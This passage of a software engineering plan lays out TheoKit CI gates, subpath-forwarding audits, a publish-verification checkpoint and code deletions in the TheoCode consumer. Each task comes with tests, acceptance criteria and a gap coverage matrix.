**Objective:** make the failure class mechanically detectable, and make a closure reach a consumer by mechanism.

### T4.1 — Add the layer→consumer invention gate

#### Objective
CI warns when a capability the layer invents is exported as a type whose enforcement stays private.

#### Why this step (action + reasoning)

**What this step does.** Adds `scripts/check-invention-reachability.mjs` plus `tests/unit/surface-invention-gate.test.ts`, wired into `check:all`, running in warn mode with a sunset.

**Why it is necessary now.** This is the root cause. `check-surface-parity.mjs` is correct and, by construction, can only ask whether the layer forwards what the SDK exports at a shared subpath name — so the 14 own-invention subpaths are skipped with a written reason. Nothing asks the inverse. `ApprovalPosture` (type exported, enforcement private) and `TheokitAgentError` (base unexported under 29 subclasses) are the two live instances this run measured; without the gate, the next one costs another consumer another rebuild. Cites D2, D3, D8.

#### Evidence
- `scripts/check-surface-parity.mjs:16-24` — the "decision, not coverage" contract; `:63-70` — the 14 skipped own-surface subpaths with the reason.
- `packages/agents/src/bridge/index.ts:70` vs `approval-posture.ts:116` — the type/enforcement split.
- `packages/agents/src/errors.ts:18` — one re-export under 29 subclasses.
- `packages/theo/src/server/agent/index.ts` (the provider-resolver note) — a symbol marked `@public` in its own JSDoc and exported by nothing, which is why D3 rejects the tag as the primary mechanism.

#### Files to edit
```
scripts/check-invention-reachability.mjs (NEW) — the gate
tests/unit/surface-invention-gate.test.ts (NEW) — behaviour tests for the gate itself
rules/invention-reachability-allowlist.txt (NEW) — deliberate type-only exports, with sunsets
package.json — wire into check:all
```

#### Deep file dependency analysis
- The gate imports `declaredExports()` from T0.1's helper — hence the Phase 0 → Phase 4 dependency. Duplicating the parser would create two answers to "what does this package export", which is the DRY violation `rules/system-design-guardrails.md § G12` names.
- `package.json`'s `check:all` already chains nine gates; adding one keeps the chain's shape.
- Test path: `tests/unit/**` is discovered by the root vitest `root` project (`vitest.config.ts:28`). `scripts/__tests__/*.test.mjs` has **no precedent in this repo**, so the gate's test lives under `tests/unit/` — a pre-flight path decision, not a preference.

#### Deep Dives
- **The rule (D3).** For every exported **type** matching the decision/policy name shapes whose module also contains an unexported function that takes that type as a parameter, require a callable export from the same module. The pairing (type + function-consuming-that-type in the same module) is what makes the heuristic more than a name match.
- **Invariant.** The gate never fails on a symbol with an allowlist entry that has not reached its sunset.
- **Invariant.** An expired allowlist entry is **ignored** — the finding re-fires at full severity, per `code-quality-golden-rule.md § 4`.
- **Edge case.** A module exporting only types by design (pure type modules) → matched by the "no function consuming the type" clause and not flagged.
- **Honesty.** The heuristic will produce false positives (Risk R7). The gate's own report must say so and print the allowlist path.

#### Pseudo-code / Signatures
```pseudocode
for each published subpath of packages/agents:
  for each module reachable from its entry:
    types = exported type declarations matching /(Posture|Policy|Decision|Mode|Strategy)$/
    for t in types:
      consumers = functions in the SAME module taking t as a parameter
      if consumers.length > 0 and none of them is exported:
        if allowlisted(t) and not expired: continue
        report WARN: `${t} is exported as a type; its enforcement ${consumers[0].name} is not reachable`

# Example — today
ApprovalPosture (exported type, bridge/approval-posture.ts)
  consumers: applyPosture(extra, m8, posturePolicy, gated)   -- not exported
  → WARN: ApprovalPosture is exported as a type; its enforcement applyPosture is not reachable
```

#### Tasks
1. Write the gate's behaviour tests first (RED) with fixture modules.
2. Implement the gate, importing T0.1's `declaredExports()`.
3. Run against the real tree; capture every finding.
4. For each finding, either export the enforcement (T2.1 already does one) or add an allowlist entry with a sunset ≤ 2026-11-13.
5. Wire `check:invention` into `check:all` in warn mode.

#### TDD
```
RED:     test_gate_flags_a_type_whose_enforcement_is_unexported() — fixture reproducing ApprovalPosture
RED:     test_gate_ignores_a_pure_type_module()
RED:     test_gate_honours_an_unexpired_allowlist_entry()
RED:     test_gate_refires_on_an_expired_allowlist_entry()
RED:     test_an_absent_allowlist_is_an_empty_allowlist_not_a_crash() — EC-18
RED:     test_a_malformed_sunset_is_reported_and_the_entry_is_ignored() — EC-18
RED:     test_gate_exits_zero_in_warn_mode_and_nonzero_after_sunset()
GREEN:   implement the gate
REFACTOR: share declaredExports() with T0.1 rather than re-parsing
VERIFY:  pnpm vitest run tests/unit/surface-invention-gate.test.ts && node scripts/check-invention-reachability.mjs
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] The gate reproduces the `ApprovalPosture` finding on a fixture.
- [ ] Warn mode exits 0 — `node scripts/check-invention-reachability.mjs` returns exit code 0, and the file contains the sunset date `2026-11-13`.
- [ ] Expired allowlist entries re-fire — `gate_refires_on_an_expired_allowlist_entry()` passes.
- [ ] `check:all` includes it.
- [ ] Pass: size — `wc -l scripts/check-invention-reachability.mjs` under 500.

#### DoD
- [ ] `pnpm check:all` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added` naming the sunset date.

### T4.2 — Make the boundary claim true, and extend the index to the published ecosystem

#### Objective
`index.ts:139-141` states a measured fact, and the capability index covers the packages a customer actually needs.

#### Why this step (action + reasoning)

**What this step does.** Audits the ~15 SDK subpaths with no layer door, decides each (forward / out-with-reason), rewrites the boundary comment to match the outcome, and adds capability-index sections for `@theokit/tui`, `theokit/server` and the SDK subpaths a consumer needs.

**Why it is necessary now.** The boundary is documented as closed and is measurably open, which is worse than documenting it as partial — a consumer reads the claim and stops looking. And the index answers "does TheoKit have X" for one package while the consumer needs three, with four of its own registered gaps sitting against `@theokit/tui`. Cites D2, D6, and blueprint `m67` (verify against the consumed version — `4.52.1` today makes these crossable, unlike August's `4.40.0`).

#### Evidence
- `packages/agents/src/index.ts:139-141` — the closed-boundary declaration.
- Measured holes: `./workflow`, `./eval`, `./task-store`, `./cron`, `./subscription`, `./context`, `./project`, `./skills`, `./sanitize`, `./filesystem`, `./client`, `./server/auth`, `./internal/security`, partials on `./a2a` and `./compaction`; root-only `PermissionEngine`, `JobQueue`, `MemoryAdapter`, `Budget`, `Task`, `EventBus`, `Security`.
- `TheoCode/packages/shared/src/agent.test.ts:52` — the consumer depends on the layer alone, enforced by test.
- `wiki/capability-index.md` — 21 rows, all `@theokit/agents`.
- Blueprint `m67-layered-boundary-passthrough` § "A causa real" — the tarball-by-tarball measurement establishing that a re-export plan must first verify the symbol exists in the consumed version.

#### Files to edit
```
packages/agents/src/index.ts — the boundary comment states the measured outcome
packages/agents/package.json — new subpaths for whatever is forwarded
scripts/check-surface-parity.mjs — DECISIONS gains the decided subpaths
wiki/capability-index.md — sections for @theokit/tui, theokit/server, SDK subpaths
CLAUDE.md — the Ecosystem table is completed or explicitly demoted
```

#### Deep file dependency analysis
- `index.ts` (367 LOC) carries the 35K bundle ceiling; forwarding symbols to the **root** would breach it, so forwards go to subpaths. That constraint decides the shape, not preference.
- `check-surface-parity.mjs` (336 LOC): `DECISIONS` grows; the "decision, not coverage" contract at `:16-24` must survive — each new entry is a written decision, never a coverage tick.
- `CLAUDE.md` (342 LOC) already carries a correction note admitting the table names 5 of 11 repos; leaving it contradictory is the state this task ends.

#### Deep Dives
- **Per-subpath decision, not bulk forwarding.** Each of the ~15 gets `forward` or `out-with-reason`. Bulk-forwarding would grow the surface without a consumer, violating `rules/system-design-guardrails.md § G7` and `§ G11`.
- **Invariant.** A subpath forwarded must resolve in the consumed SDK version (`4.52.1`) — verified by import, not by changelog (the `m67` lesson).
- **Edge case.** A subpath that exists in the SDK but whose content is genuinely internal → `out-with-reason`, recorded in `DECISIONS`.

#### Tasks
1. Enumerate the SDK's published subpaths and diff against the layer's doors.
2. For each hole, decide and write the reason.
3. Add subpaths for the forwards; add `DECISIONS` entries for all.
4. Rewrite the boundary comment to state the measured outcome.
5. Add the three index sections.
6. Complete or demote the `CLAUDE.md` table.

#### TDD
```
RED:     test_every_sdk_subpath_has_a_written_decision() — fails today (~15 undecided)
RED:     test_every_forwarded_subpath_resolves_at_runtime() — the m67 lesson as a test
RED:     test_boundary_comment_matches_the_decision_registry() — no claim without backing
GREEN:   decide, forward, and rewrite
REFACTOR: None expected
VERIFY:  pnpm check:surface-parity && pnpm vitest run tests/integration/crossval-gaps.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] Zero SDK subpaths without a written decision — `pnpm check:surface-parity` exits 0.
- [ ] Every forwarded subpath imports from the built package — `every_forwarded_subpath_resolves_at_runtime()` passes.
- [ ] The boundary comment matches the registry — `boundary_comment_matches_the_decision_registry()` passes.
- [ ] The index has sections for `@theokit/tui`, `theokit/server` and the decided SDK subpaths.
- [ ] `CLAUDE.md`'s table is complete or explicitly scoped to wired seams.
- [ ] Pass: bundle — `pnpm check:bundle` green.

#### DoD
- [ ] `pnpm check:all` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Changed`.

### T4.3 — Make a closure reach the consumer by mechanism

#### Objective
Every gap-closing CHANGELOG entry names the consumer gap id it closes, and the capability index records the version.

#### Why this step (action + reasoning)

**What this step does.** Adds a convention plus a check: a CHANGELOG entry that closes a registered consumer gap carries `closes: U-N`, and the corresponding capability-index row's `Landed` column is populated in the same change.

**Why it is necessary now.** The consumer's register says 8 open and zero are fully open. Five closures reached this consumer **by accident** — the maintainer is the same on both sides. A customer without that overlap keeps reading "open" against capabilities that ship, and keeps rebuilding. That is not a code gap; it is the absence of a channel, and it is why the same measurement keeps finding the same class of waste. Cites D2's family reasoning.

#### Evidence
- `TheoCode/BACKLOG.md:421-441` — 8 rows marked open; verified: U-2, U-3, U-5, U-6, U-7, U-8, U-9, U-11 closed and reachable; U-7 and U-9 already adopted without the row moving.
- `BACKLOG.md:425` — *"TheoCode and `theokit-framework/*` share a maintainer, so these are fixed at the source"* — the overlap this task removes the dependency on.
- `wiki/capability-index.md:22` — the `Landed` column already exists and is the right home.

#### Files to edit
```
scripts/check-changelog-closes.mjs (NEW) — the convention check
tests/unit/changelog-closes.test.ts (NEW) — RED first
CHANGELOG.md — retro-annotate the entries that closed U-2, U-3, U-5, U-6, U-7, U-8, U-9, U-11
package.json — wire into check:all
```

#### Deep file dependency analysis
- `CHANGELOG.md` (3474 LOC) — Unbreakable Rule 6 forbids editing already-released entries. Retro-annotation therefore goes into a **new** `[Unreleased]` note listing the historical closures, not into the released sections.
- The check reads `[Unreleased]` only, so it never re-litigates history.

#### Deep Dives
- **Invariant (Rule 6).** Released entries are never edited. The historical mapping lands as one new entry.
- **Edge case.** A change that closes no consumer gap → no annotation required; the check only fires when the diff touches a file named in a registered gap's `target_location`.
- **Honesty.** This is a convention with a mechanical check, not a notification system. It makes the closure *discoverable* in the artifact the consumer already reads; it does not push.

#### Tasks
1. Write the RED test for the convention check.
2. Implement the check over `[Unreleased]`.
3. Add the historical mapping entry for the eight closed rows.
4. Wire into `check:all` (warn mode, D8).

#### TDD
```
RED:     test_entry_touching_a_registered_gap_file_without_closes_is_flagged()
RED:     test_entry_with_closes_passes()
RED:     test_released_sections_are_never_read()
RED:     test_an_absent_unreleased_section_is_not_a_violation() — EC-19, a repo mid-release
GREEN:   implement
REFACTOR: None expected
VERIFY:  pnpm vitest run tests/unit/changelog-closes.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] The check flags a gap-closing change lacking `closes:`.
- [ ] Released CHANGELOG sections are untouched — `released_sections_are_never_read()` passes and `git diff CHANGELOG.md` shows no edit above the `[Unreleased]` heading.
- [ ] The eight historical closures are recorded in one `[Unreleased]` entry.

#### DoD
- [ ] `pnpm check:all` green.
- [ ] `CHANGELOG.md` updated.

---

## Phase 5: Adoption in TheoCode — the closure proven by deletion

**Objective:** delete ≥ 900 lines from the consumer by consuming the closures, and take its upstream register to zero open rows.

### T5.0 — Publish checkpoint (BLOCKING)

#### Objective
Every floor this phase depends on resolves on the npm registry.

#### Why this step (action + reasoning)

**What this step does.** Verifies `npm view` resolves the new versions of `@theokit/agents`, `@theokit/tui` and `@theokit/sdk`, and records the exact versions the consumer will pin.

**Why it is necessary now.** TheoCode consumes published packages. The 2026-08-15 audit ended `Not closed` on exactly this — PR #312 with no approving review and a stale npm token (`E401`, dated 2026-08-05). Starting consumer edits against unpublished code produces a branch that cannot be verified and a false sense of completion. Cites Risk R1 and R2.

#### Evidence
- Audit `2026-08-15-theocode-100pct-adoption.md § State of the promise` — both gates, named.
- `TheoCode/packages/agent/package.json:23` — `"@theokit/agents": "^9.4.0"`, the floor that must rise.
- `scripts/verify-publish-credential.mjs` — refuses before a release rather than after.

> **Accepted risk (EC-23).** Risk R2 covers the *mixed-floor* hazard this checkpoint gates. What it does not cover is the mundane case — one of the four repositories carrying local drift or a conflicted `workspace` branch. Engineering around that would mean the plan managing four git states, which is worse than the problem. Accepted: the implementer resolves branch state per repository before Phase 5, as ordinary hygiene, and `rules/git-safety.md § 1` already governs how.

#### Files to edit
```
(none — verification only; the output is recorded in the implementation log)
```

#### Deep Dives
- **Invariant (EC-6) — verify the EXPECTED version, not that *a* version resolves.** `npm view <pkg> version` returns the `latest` dist-tag, which resolves successfully while still pointing at the **previous** release if the publish partially failed, if the registry is lagging, or if the release went out under a different tag. A checkpoint that only asks "does it resolve" passes in exactly the scenario it exists to catch, and Phase 5 then edits and tests the consumer against code that does not contain the closures — producing green tests that prove nothing.
- **The expected version is read, not typed.** Each package's `package.json#version` in the working tree is the source; comparing against a hand-copied string reintroduces the drift the check is for.
- **Edge case.** A package that legitimately did not change in this plan (none today, but the check must not demand a bump that no task produced) → its expected version equals its current published one, and equality is still asserted.

#### Tasks
1. Confirm the three release PRs are merged (human approval — Unbreakable Rule 4).
2. Read each expected version from its `package.json#version` in the working tree.
3. Assert the registry serves **that exact version**: `npm view <pkg>@<expected> version` must return non-empty.
4. Record the expected/observed pair per package.
5. STOP if any package's expected version is not served.

#### TDD
```
RED:     test_expected_version_is_served_by_the_registry() — GIVEN the version each package
         declares in its own package.json, WHEN `npm view <pkg>@<version> version` runs, THEN it
         returns that exact version. Red while any of the three is unpublished, which is the
         state this checkpoint exists to detect.
GREEN:   the publish itself is the human-gated release action (Unbreakable Rule 4); this task
         only VERIFIES it and records the expected/observed pair per package.
REFACTOR: None expected
VERIFY:  for P in @theokit/agents @theokit/tui @theokit/sdk; do
           EXPECTED=$(node -p "require('./<path>/package.json').version")
           test -n "$(npm view "$P@$EXPECTED" version 2>/dev/null)" || { echo "BLOCKED: $P@$EXPECTED not on the registry"; exit 1; }
         done
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] For each of the three packages, the **expected** version (read from `package.json`) is served by the registry — not merely that some version resolves (EC-6).
- [ ] The expected/observed pair is recorded per package — `npm view <pkg>@<expected> version` output pasted into the implementation log.

#### DoD
- [ ] No Phase 5 task starts before this passes.

### T5.1 — Delete the duplicated approval rule (both copies)

#### Objective
`shouldAutoApprove` and `resolveHeadlessApproval` are deleted; both call sites use the framework predicate.

#### Why this step (action + reasoning)

**What this step does.** Bumps `@theokit/agents`, replaces both copies with the framework's `shouldAutoApprove`, deletes `approval-mode.ts`'s rule and `approval-policy.ts`'s, and runs the consumer's own suite.

**Why it is necessary now.** This is the deletion that proves T2.1. `approval-posture.ts:69-72` claims the rule lives once; until both copies are gone, it does not. A security rule in three places is worse than in two. Cites D5.

#### Evidence
- `TheoCode/packages/tui/src/consent/approval-mode.ts:22-33` — copy 1 (44 LOC file, `2329373`, 2026-08-15).
- `TheoCode/packages/agent/src/config/approval-policy.ts` — copy 2 (56 LOC, `41125d1`).
- `packages/agents/src/bridge/approval-posture.ts:69-72` — the G12 note.

#### Files to edit
```
TheoCode: packages/agent/package.json, packages/tui/package.json — bump the floor
TheoCode: packages/tui/src/consent/approval-mode.ts — delete the rule, import the framework predicate
TheoCode: packages/agent/src/config/approval-policy.ts — same
TheoCode: packages/tui/src/consent/approval-mode.test.ts — keep asserting B-006 against the framework symbol
```

#### Deep file dependency analysis
- `approval-mode.ts` also exports `parseApprovalMode` and `nextApprovalMode` (mode cycling) — those are UI policy and stay. Only the decision rule moves.
- Its test file is the B-006 regression suite; it is retargeted, not deleted — the scar must keep being asserted on the consumer side too.

#### Deep Dives
- **Invariant.** B-006 must still hold end to end: with `full-auto` and no enforced sandbox, no tool auto-approves.
- **Edge case.** If the framework predicate's tool-name set differs from the consumer's `EDIT_TOOLS`, the difference is a finding, not a silent behaviour change.

#### Tasks
1. Bump the floor to the version from T5.0.
2. Retarget the B-006 test at the framework symbol (RED — not yet imported).
3. Replace both copies.
4. Delete the local rule bodies.
5. Run the consumer suite.

#### TDD
```
RED:     test_b006_holds_through_the_framework_predicate() — full-auto + unenforced ⇒ no auto-approval
RED:     test_headless_and_tui_paths_agree() — both now call one implementation
GREEN:   import and delete
REFACTOR: None expected
VERIFY:  cd TheoCode && npm test
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] `grep -rn "shouldAutoApprove" TheoCode/packages/*/src` finds only the import.
- [ ] B-006 asserted against the framework symbol — `b006_holds_through_the_framework_predicate()` passes.
- [ ] TheoCode suite green — `cd TheoCode && npm test` reports at least the 532/533 baseline.
- [ ] At least 250 LOC deleted — `git diff --stat` on this task's commits shows the deletion count.

#### DoD
- [ ] `cd TheoCode && npm test && npm run typecheck && npm run depcruise` green.
- [ ] TheoCode `CHANGELOG.md` updated.
- [ ] `BACKLOG.md` — no row to close (this was not a U-row; it is recorded as an adoption note).

### T5.2 — Adopt the framework's tool presentation, image tool and sandbox oracle

#### Objective
`tool-header.ts`'s three maps become overrides; `view-image.ts` and `sandbox-policy.ts` are deleted.

#### Why this step (action + reasoning)

**What this step does.** Replaces the three name-keyed maps with `toolPresentation({...})` overrides, switches `view_image` to the framework factory, and deletes the second sandbox oracle in favour of `writableRootsFor`.

**Why it is necessary now.** These are three independent deletions unlocked by T1.2, T3.1 and the already-shipped `writableRootsFor`. U-6 is already consumer debt — the framework symbol is exported and richer, and its docblock names U-6. Cites D6, Risk R8.

#### Evidence
- `TheoCode/packages/tui/src/formatting/tool-header.ts:34,90,192` — 292 LOC.
- `TheoCode/packages/agent/src/tools/view-image.ts` — 49 LOC, `a94304c`.
- `TheoCode/packages/agent/src/config/sandbox-policy.ts` — 27 LOC, `616f645`.
- `../theokit-sdk/packages/sdk/src/sandbox/bwrap.ts:58` — `writableRootsFor`, docblock naming U-6, exported via `packages/agents/src/sandbox-entry.ts:47`.

#### Files to edit
```
TheoCode: packages/tui/src/formatting/tool-header.ts — overrides over framework defaults
TheoCode: packages/agent/src/tools/view-image.ts — DELETE
TheoCode: packages/agent/src/tools/registry.ts — import the framework factory
TheoCode: packages/agent/src/config/sandbox-policy.ts — DELETE
TheoCode: packages/tui/src/commands/command-template.ts — DELETE (T3.3 expander)
TheoCode: packages/tui/src/commands/subagent-inventory.ts — DELETE (listSubagentNames, M81)
TheoCode: packages/tui/src/consent/pending-approvals.ts — reduce to a payload type over createPendingLedger (T2.7)
TheoCode: packages/tui/src/components/ — adopt centred windowAround + keyboardHelpFor (T3.4)
TheoCode: BACKLOG.md — close U-6 with evidence
```

**v1.1 scope addition.** The four deletions above were named by the surface sweep and had no task in v1.0: `command-template.ts` (112), `subagent-inventory.ts` (42, plus its 55-line test), the surface-side pending ledger (~100), and the two `components/` helpers (~102). Together with the v1.0 items this task now accounts for ~700 LOC rather than ~350. Each is verified equivalent before deletion, never assumed.

#### Deep file dependency analysis
- `registry.ts:2,86` — the `view_image` import and wiring; `:107-114` throws `tool_name_mismatch`, which stays as the local contract check.
- `sandbox-policy.ts` has callers in `config/`; each is retargeted at `writableRootsFor`, whose return is `[]` where the local returned `null` — the one behavioural difference, asserted by test.

#### Deep Dives
- **Invariant (R8).** The image tool must return the same content-block shape after the switch, asserted before deletion.
- **Invariant.** `writableRootsFor` returns `[]` where the local oracle returned `null`; every call site's emptiness check is updated, and a test covers the empty case explicitly — an `if (roots)` that was false on `null` becomes true on `[]`, which is a silent inversion if missed.

#### Tasks
1. Assert image-tool shape equivalence (RED).
2. Switch `registry.ts` to the framework factory; delete `view-image.ts`.
3. Replace the three maps with overrides; keep the product wording.
4. Retarget `sandbox-policy.ts` callers; delete the file; fix the `null` → `[]` checks.
5. Close U-6 in `BACKLOG.md` with the commit as evidence.

#### TDD
```
RED:     test_framework_image_tool_returns_the_same_content_block()
RED:     test_tool_headers_keep_the_products_wording_through_overrides()
RED:     test_empty_writable_roots_is_handled_as_empty_not_as_present() — the null → [] inversion
RED:     test_framework_template_expander_matches_the_local_one_on_the_products_fixtures()
RED:     subagent_names_come_from_listSubagentNames_and_the_second_reader_is_gone()
RED:     test_pending_approvals_state_round_trips_through_the_ledger_payload()
RED:     test_backtrack_overlay_centres_on_the_selected_turn_via_the_framework_window()
GREEN:   switch and delete
REFACTOR: None expected
VERIFY:  cd TheoCode && npm test
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] `view-image.ts` and `sandbox-policy.ts` no longer exist.
- [ ] Tool headers render the product's wording via overrides — `tool_headers_keep_the_products_wording_through_overrides()` passes.
- [ ] The `[]` vs `null` inversion is covered by a test.
- [ ] U-6 closed in `BACKLOG.md` with evidence.
- [ ] At least 350 LOC deleted — `git diff --stat` on this task's commits shows the deletion count.

#### DoD
- [ ] `cd TheoCode && npm test && npm run depcruise` green.

### T5.3 — Adopt the GC seam, the liveness oracle and the corrected fork

#### Objective
`all-sessions.ts` shrinks to enumeration + policy; `liveness-oracle.ts` is deleted; backtrack uses the corrected fork.

#### Why this step (action + reasoning)

**What this step does.** Replaces the local oracle with the framework's, passes `Agent.delete` as the async remover, and retargets backtrack at the corrected `forkBeforeUserTurn` with `selectedText`.

**Why it is necessary now.** This is the largest deletion and it proves T2.2, T2.3 and T3.2 together. Until the consumer's 858-LOC GC cluster shrinks, U-1 stays `CLOSED_WRONG_SHAPE` regardless of what the framework exports. Cites D4, D6, Risk R5.

#### Evidence
- `TheoCode/packages/agent/src/session/gc/all-sessions.ts` — 442 LOC.
- `TheoCode/packages/agent/src/session/liveness-oracle.ts` — 188 LOC, `1578995`.
- `TheoCode/packages/agent/src/session/backtrack.ts` — 175 LOC, `2329373`.
- `TheoCode/packages/tui/src/backtrack/backtrack.ts:9-13` — the wrapper imports.

#### Files to edit
```
TheoCode: packages/agent/src/session/liveness-oracle.ts — DELETE
TheoCode: packages/agent/src/session/gc/all-sessions.ts — enumeration + policy only
TheoCode: packages/agent/src/session/gc/per-session.ts — pass Agent.delete as the remover
TheoCode: packages/agent/src/session/backtrack.ts — delegate to the corrected fork
TheoCode: packages/tui/src/backtrack/backtrack.ts — consume selectedText
TheoCode: BACKLOG.md — close U-1 and U-10's closed half
```

#### Deep file dependency analysis
- `all-sessions.ts` keeps its injected `opts.listProjects()` (product policy per D4) and loses the classification.
- `backtrack.ts` (agent side) currently *is* the corrected window; after adoption it becomes a thin call. The three corrections must be verified as equivalent before deletion, not assumed.

#### Deep Dives
- **Invariant (R5).** The full-scale behaviour — 13.269 directories, shared budget — is verified once on the real machine and recorded as evidence in the implementation log. The framework's fixture test does not substitute for it.
- **Invariant.** `UNDETERMINED` must still refuse deletion end to end.
- **Edge case.** `Agent.delete` rejecting mid-sweep — the consumer's UI must show the registry failure separately, which T2.2's separate fields make possible.

#### Tasks
1. Verify the framework oracle's classification matches the local one on the real project tree (evidence, not assumption).
2. Delete `liveness-oracle.ts`; retarget `all-sessions.ts`.
3. Pass `Agent.delete` as the async remover.
4. Retarget `backtrack.ts` at the corrected fork; consume `selectedText`.
5. Close U-1 and U-10's closed half in `BACKLOG.md`.

#### TDD
```
RED:     test_framework_oracle_classifies_the_real_tree_identically() — recorded evidence, real machine
RED:     test_agent_delete_is_accepted_as_the_remover()
RED:     test_undetermined_still_refuses_deletion()
RED:     test_backtrack_lands_on_the_same_turn_as_the_local_window_did()
RED:     test_registry_failure_is_shown_separately_in_the_ui()
GREEN:   delete and delegate
REFACTOR: None expected
VERIFY:  cd TheoCode && npm test
```

#### Concurrency tests
The sweep now awaits a caller-supplied async remover per session.

- **Cancellation / timeout** — a remover that never settles must not hang the sweep; assert the timeout surfaces and the sweep continues.
- **Atomic-counter invariant** — N sessions, remover increments a counter; assert the count equals sessions actually deleted and that a rejection at session *k* does not stop *k+1..N*.

#### Acceptance Criteria
- [ ] `liveness-oracle.ts` no longer exists in TheoCode.
- [ ] `all-sessions.ts` reduced to enumeration + policy.
- [ ] Real-machine classification equivalence recorded — `framework_oracle_classifies_the_real_tree_identically()` output pasted into the implementation log.
- [ ] U-1 and U-10 closed in `BACKLOG.md` with evidence.
- [ ] At least 400 LOC deleted — `git diff --stat` on this task's commits shows the deletion count.

#### DoD
- [ ] `cd TheoCode && npm test && npm run typecheck && npm run depcruise` green.

### T5.4 — Re-measure and close the register

#### Objective
The 17 assertions are green, `BACKLOG.md`'s upstream register has zero open rows, and the re-score is recorded with its arithmetic.

#### Why this step (action + reasoning)

**What this step does.** Extends `crossval-gaps.test.ts` to 17 assertions, re-scores each dimension citing the assertion that changed, and records the weighted average.

**Why it is necessary now.** Without this, the plan's Goal has no observation. And the score must be re-derived from evidence rather than asserted — Risk R4's mitigation is exactly this: a score movement without a corresponding green assertion is refused. Cites D1's register discipline.

#### Evidence
- `tests/integration/crossval-gaps.test.ts` — 512 LOC, 12 assertions today.
- `cross-validation-output/cross-validation.db` — 17 gaps, 17 dimensions, weights.
- `cross-validation-output/scoring/dimension_scores.md` — the 3,31 baseline and its arithmetic.

#### Files to edit
```
tests/integration/crossval-gaps.test.ts — extend to 17 assertions
cross-validation-output/scoring/dimension_scores.md — the re-score with arithmetic
.claude/knowledge-base/audits/2026-08-15-theocode-crossval.md (NEW) — promote the report out of the gitignored dir
```

#### Deep Dives
- **Invariant (R3).** Weights are NOT adjusted. The same 17 dimensions with the same weights, or the comparison is meaningless. The baseline to compare against is **3,37** — the 2026-08-16 corrected figure — not the 3,31 first reported; using the uncorrected number would credit this plan with a measurement fix it did not perform.
- **Invariant (R4).** Each re-scored dimension cites the assertion id that changed. A dimension whose assertions did not change keeps its score.
- **Honesty.** If the result lands below 4,60, the reported number is the result. `plan-confidence-golden-rule.md` treats a moved target as fabrication.

#### Tasks
1. Add one assertion per registered gap not yet covered (5 new), including T1.1's reachability pin in place of the falsified gap-16 assertion.
2. Re-score each dimension, citing assertions.
3. Recompute the weighted average and write the arithmetic.
4. Promote the report **and the score card** into `.claude/knowledge-base/audits/` so citations resolve in a fresh clone — `.gitignore:21` keeps `cross-validation-output/` local, so anything cited from there is unresolvable to anyone but this machine. (Caught by `/plan-confidence` on v1.2: two criteria citing the score card by bare filename fired `fabricated_citation`, correctly.)
5. Verify `BACKLOG.md` has zero open upstream rows.

#### TDD
```
RED:     test_all_seventeen_gap_assertions_present_and_green()
GREEN:   (the assertions are green because Phases 0-5 closed the gaps)
REFACTOR: None expected
VERIFY:  pnpm vitest run tests/integration/crossval-gaps.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] 17/17 assertions green — `pnpm vitest run tests/integration/crossval-gaps.test.ts` exits 0.
- [ ] Weighted average recomputed with unchanged weights — `cross-validation-output/scoring/dimension_scores.md` shows the arithmetic.
- [ ] Every re-scored dimension cites its assertion — each row in `cross-validation-output/scoring/dimension_scores.md` names the test that changed.
- [ ] `BACKLOG.md` upstream register: zero open rows.
- [ ] The reported number equals the computed number — the score card and `cross-validation-output/cross-validation.db` agree, checked by recomputing the weighted average from the database.

#### DoD
- [ ] `pnpm test` green.
- [ ] The audit doc exists in the versioned tree.

---

## Coverage Matrix

| # | Gap / Requirement (from the 2026-08-15 cross-validation) | Task(s) | Resolution |
|---|---|---|---|
| 14 | Capability index cites non-existent symbols; guard vacuous (**critical**) | T0.1 | Declared-export matching + row audit + inverse honest-gaps assertion |
| 13 | U-1 — GC single-project, transcript-only, sync | T2.2, T3.2, T5.3 | Async remover seam + liveness oracle absorbed + consumer deletion |
| 15 | `createViewImageTool` withheld without a reason | T1.2, T5.2 | Cross the symbols (or write the reason) + consumer deletes 49 LOC |
| ~~16~~ | ~~`TheokitAgentError` not re-exported~~ — **NOT A GAP (EC-1)** | T1.1 | **Falsified.** Reachable via the `export *` forward at `dist/index.d.ts:8`; verified at runtime and by type-check. T1.1 pins it with a regression test and reclassifies the database row as a measurement error. Counts as *corrected*, not *closed*. |
| 17 | Auto-approve rule absorbed behind a type-only export | T2.1, T5.1 | Callable predicate + `ApprovalMode` + both consumer copies deleted |
| 28 | `applyPosture` unreachable by any surface | T2.1, T5.1 | Same — one implementation, reachable |
| 18 | MCP OAuth implemented, reachable from no package | T1.3 | Publish the subpath or state "internal" with the closure measurement |
| 19 | Pass-through boundary declared closed, ~15 holes | T4.2 | Per-subpath decision + boundary comment matches the registry |
| 20 | Two "Honest gaps" rows already closed | T0.1 | Inverse assertion: a listed gap MUST NOT resolve |
| 21 | All-projects sweep + liveness oracle 858 LOC in consumer | T3.2, T5.3 | Oracle absorbed, enumeration stays injected |
| 22 | Per-tool rendering 400 LOC keyed by framework names | T3.1, T5.2 | Three default maps in `@theokit/tui`, overridable |
| 23 | CLI argument parsing 470 LOC alone | (deferred) | Recorded as needing a second consumer before absorption — see Unresolved Q4's reasoning applied here |
| **F60** | Capability index answers for 1 package of the published ecosystem (**high**) | T4.2, T5.4 | Sections for `@theokit/tui`, `theokit/server` and the decided SDK subpaths; the corrected guard (T0.1) keeps them true |
| **F63** | The reference's largest module (`commands/`, 2.659 LOC) was never swept | T3.3, T5.2 | **Superseded** — this run swept it; the finding's content became gaps 23 and 29 plus the template expander. Row kept so the supersession is recorded rather than the finding silently dropped |
| **F64** | `consent/` (430) and `backtrack/` (335) carry zero `@theokit/*` imports | T2.1, T2.3, T2.7, T5.1, T5.3 | **Superseded** — the deep sweep resolved both: `consent/` → gaps 17/28 + the ledger widening; `backtrack/` → the `forkBeforeUserTurn` defect + `readUserTurnPreviews` + `legacyRootHint` |
